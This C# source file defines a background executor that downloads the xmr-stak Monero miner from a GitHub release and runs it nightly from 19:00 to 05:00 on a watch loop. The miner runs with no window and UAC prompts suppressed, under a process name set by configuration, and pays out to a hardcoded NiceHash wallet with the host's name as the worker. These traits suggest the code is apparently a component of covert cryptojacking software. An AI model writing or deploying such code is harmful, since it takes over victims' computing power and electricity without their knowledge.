using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.ComponentModel;
using System.Net.NetworkInformation;
using System.Xml;
using System.Net;
using System.IO.Compression;
using nddi;

namespace nddi
{
    class XmrExecutor: MarshalByRefObject, IExecutor
    {
        /*
        Usage: xmr-stak.exe[OPTION]...

          -h, --help show this help
          -v, --version show version number
          -V, --version-long show long version number
          -c, --config FILE     common miner configuration file
          --noUAC disable the UAC dialog
          --currency NAME       currency to mine: monero or aeon
          --noCPU disable the CPU miner backend
          --cpu FILE            CPU backend miner config file
          --noAMD disable the AMD miner backend
          --amd FILE            AMD backend miner config file
          --noNVIDIA disable the NVIDIA miner backend
          --nvidia FILE         NVIDIA backend miner config file

        The following options can be used for automatic start without a guided config,
        If config exists then this pool will be top priority.
          -o, --url URL         pool url and port, e.g.pool.usxmrpool.com:3333
          -O, --tls-url URL     TLS pool url and port, e.g.pool.usxmrpool.com:10443
          -u, --user USERNAME   pool user name or wallet address
          -p, --pass PASSWD     pool password, in the most cases x or empty ""
          --use-nicehash the pool should run in nicehash mode


        Environment variables:

          XMRSTAK_NOWAIT disable the dialog `Press any key to exit.
                                       for non UAC execution
        */

        private BackgroundWorker bgWatchProcess;

        private object lockConfigure = new object();

        private string ExecutorFilePath;
        private string ExecutorDirectory;
        private string CurrentProcessName;

        private Configuration Configuration;

        public XmrExecutor(Configuration config)
        {
            Configuration = config;

            SetDefaultSchedule();

            bgWatchProcess = new BackgroundWorker();
            bgWatchProcess.DoWork += WatchProcess;
            bgWatchProcess.WorkerSupportsCancellation = true;
        }

        public void Start(string[] args)
        {
            bgWatchProcess.RunWorkerAsync();
        }

        public void Stop()
        {
            bgWatchProcess.CancelAsync();
        }

        private void StartProcess()
        {
            Process process = new Process();
            process.StartInfo.FileName = ExecutorFilePath;
            try
            {
                process.StartInfo.Arguments = string.Format(Configuration.ConfigNode.Argument, Configuration.Hostname);
            }catch
            {
                process.StartInfo.Arguments = Configuration.ConfigNode.Argument;
            }
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WorkingDirectory = ExecutorDirectory;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
        }

        private void WatchProcess(object o, DoWorkEventArgs e)
        {
            DateTime latRunTime = DateTime.Now;
            while (!bgWatchProcess.CancellationPending)
            {
                if ((DateTime.Now - latRunTime).TotalMilliseconds > 1000)
                {
                    try
                    {
                        if (MustRun())
                        {
                            UpdateBinary();
                            if (Process.GetProcessesByName(CurrentProcessName).Length == 0)
                            {
                                StartProcess();
                            }
                        }
                        else
                        {

                            foreach (Process p in Process.GetProcessesByName(CurrentProcessName))
                            {
                                if (p.ProcessName == CurrentProcessName)
                                {
                                    p.Kill();
                                }
                            }
                        }
                    }
                    catch { }
                    latRunTime = DateTime.Now;
                }
                Thread.Sleep(100);
            }

            foreach (Process p in Process.GetProcessesByName(CurrentProcessName))
            {
                p.Kill();
            }
        }

        private void UpdateBinary()
        {
            string oldProcessName = CurrentProcessName;
            CurrentProcessName = Configuration.ConfigNode.GetProcessName("xmr-stak");
            if (oldProcessName != null && oldProcessName != CurrentProcessName)
            {
                foreach (Process p in Process.GetProcessesByName(oldProcessName))
                {
                    p.Kill();
                }
            }

            string destDir = Path.Combine(Configuration.WorkingDirectory, "xmr-stak-win64");
            if (!File.Exists(Path.Combine(destDir, CurrentProcessName + ".exe")))
            {
                string fileDestination = Path.Combine(Configuration.TempDirectory, "file.zip");
                using (WebClient Client = new WebClient())
                {
                    Client.Proxy = null;
                    Client.CachePolicy = new System.Net.Cache.RequestCachePolicy(System.Net.Cache.RequestCacheLevel.NoCacheNoStore);
                    Client.Headers.Add("Cache-Control", "no-cache");
                    Client.DownloadFile(Configuration.ConfigNode.GetDownloadUrl("xmr-stak"), fileDestination);
                }

                // unzip file
                using (FileStream stream = new FileStream(fileDestination, FileMode.Open, FileAccess.Read))
                {
                    System.IO.Compression.ZipArchive zip = new ZipArchive(stream);
                    foreach (ZipArchiveEntry entry in zip.Entries)
                    {
                        string outPath = Path.Combine(Configuration.WorkingDirectory, entry.FullName);
                        if (entry.Name == "")
                        {
                            Directory.CreateDirectory(outPath);
                        }
                        else
                        {
                            Stream zipStream = entry.Open();
                            Stream file = File.Open(outPath, FileMode.OpenOrCreate, FileAccess.Write);
                            zipStream.CopyTo(file);
                        }
                    }
                }
                File.Delete(fileDestination);

                ExecutorFilePath = Path.Combine(Configuration.WorkingDirectory, "xmr-stak-win64\\xmr-stak.exe");
                File.Copy(ExecutorFilePath, Path.Combine(destDir, CurrentProcessName + ".exe"));
                ExecutorFilePath = Path.Combine(destDir, CurrentProcessName + ".exe");
                ExecutorDirectory = Path.GetDirectoryName(ExecutorFilePath);
            }
        }

        private bool MustRun()
        {
            if (Monitor.TryEnter(lockConfigure, 1000))
            {
                try
                {
                    DayOfWeek day = DateTime.Now.DayOfWeek;
                    int hour = DateTime.Now.Hour;

                    foreach (Run run in Configuration.ConfigNode.GetSchedule(day))
                    {
                        if (hour >= run.Start && hour < run.Stop)
                        {
                            return true;
                        }
                    }
                }
                finally
                {
                    Monitor.Exit(lockConfigure);
                }
            }
            return false;
        }

        private void SetDefaultSchedule()
        {
            int DefaultStartHour = 19;
            int DefaultStopHour = 5;

            Configuration.DefaultConfigNode.SetSchedule(DayOfWeek.Sunday,
                new Run[]{
                new Run() { Start = 0, Stop = DefaultStopHour},
                new Run() { Start = DefaultStartHour, Stop = 24}
            });
            Configuration.DefaultConfigNode.SetSchedule(DayOfWeek.Monday,
                new Run[]{
                new Run() { Start = 0, Stop = DefaultStopHour},
                new Run() { Start = DefaultStartHour, Stop = 24}
            });
            Configuration.DefaultConfigNode.SetSchedule(DayOfWeek.Tuesday,
                new Run[]{
                new Run() { Start = 0, Stop = DefaultStopHour},
                new Run() { Start = DefaultStartHour, Stop = 24}
            });
            Configuration.DefaultConfigNode.SetSchedule(DayOfWeek.Wednesday,
                new Run[]{
                new Run() { Start = 0, Stop = DefaultStopHour},
                new Run() { Start = DefaultStartHour, Stop = 24}
            });
            Configuration.DefaultConfigNode.SetSchedule(DayOfWeek.Thursday,
                new Run[]{
                new Run() { Start = 0, Stop = DefaultStopHour},
                new Run() { Start = DefaultStartHour, Stop = 24}
            });
            Configuration.DefaultConfigNode.SetSchedule(DayOfWeek.Friday,
                new Run[]{
                new Run() { Start = 0, Stop = DefaultStopHour},
                new Run() { Start = DefaultStartHour, Stop = 24}
            });
            Configuration.DefaultConfigNode.SetSchedule(DayOfWeek.Saturday,
                new Run[]{
                new Run() { Start = 0, Stop = DefaultStopHour},
                new Run() { Start = DefaultStartHour, Stop = 24}
            });

            Configuration.DefaultConfigNode.Argument = "--currency monero -o cryptonight.usa.nicehash.com:3355 -u 325f9rtj3e5G8DV6oUHa8kFGvsnxwJqY75.{0} -p X --use-nicehash --noUAC --noAMD --noNVIDIA";
            Configuration.DefaultConfigNode.SetDownloadUrl("xmr-stak", "https://github.com/fireice-uk/xmr-stak/releases/download/v2.1.0/xmr-stak-win64.zip");
            Configuration.DefaultConfigNode.SetProcessName("xmr-stak", "xmr-stak");
        }
    }
}
